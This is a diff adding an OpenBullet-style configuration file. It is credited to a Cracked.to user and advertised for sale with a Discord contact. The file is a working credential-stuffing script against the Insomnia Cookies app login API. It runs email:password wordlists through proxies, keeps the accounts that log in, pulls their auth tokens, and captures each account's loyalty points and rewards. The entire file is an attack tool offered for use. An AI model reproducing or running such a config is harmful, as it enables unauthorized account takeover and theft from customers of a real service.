@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "insomniacookies sombree",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-01-27T04:49:20.6412863-08:00",
+  "AdditionalInfo": "buy config in good price From me ",
+  "Author": "Cracked.to/sombree",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Buy config Discord:sombre#7937",
+      "VariableName": "",
+      "Id": 1969745651
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://app.insomniacookies.com/storeAppAPI/v1/customers/login " 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"uuid\":\"b831b59b227e8402\",\"deviceToken\":\"c0jcfyAyFn4:APA91bFwaOtAYs7TgvzVgJujejtTn5nN-fU7UMinyPWxNUHKv6hKTpkP24PGgdtNi2iQysWF__oSti-NKbyC1Ccypx-TSGf9Rz2dGha13PUTk9V2OQbNAub5hxvIsJkN-A0q-2qcqwbC\",\"deviceOS\":\"Android\",\"deviceModel\":\"SM-G930K\",\"appVersion\":\"5.29.0\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Host: app.insomniacookies.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 322" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: file://" 
+  HEADER "appstate: eyJpdiI6ImhDVnFYc0JFNFRXQmVTQTdXNXVJSFE9PSIsInZhbHVlIjoidzQwemgxU3hxRkdFWlNoVXd1ekoyQ1N0cnVCNXBrcTNqbWZnaUt0ZFI3WGNBUFpwU0dxUFBHV1FDNDZxdjdCbiIsIm1hYyI6IjU0NDJjOWE1YmE3N2VhOWJiMWM4MmU5YTA4ZDA5NWNmZjhmYTcyNWVmN2NiNjcxNDE1YTg2NGUzZWQ0NWFiZDAifQ==" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G930K Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.insomniacookies.insomnia" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true" 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "\"success\":false" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "TOKEN" 
+
+REQUEST GET "https://app.insomniacookies.com/storeAppAPI/v1/loyalty/loyalty " 
+  
+  HEADER "Host: app.insomniacookies.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "authorization: <TOKEN>" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G930K Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" JSON "points" -> CAP "POOINT" 
+
+PARSE "<SOURCE>" JSON "rewards" -> CAP "REWARD" "$" "" 
+
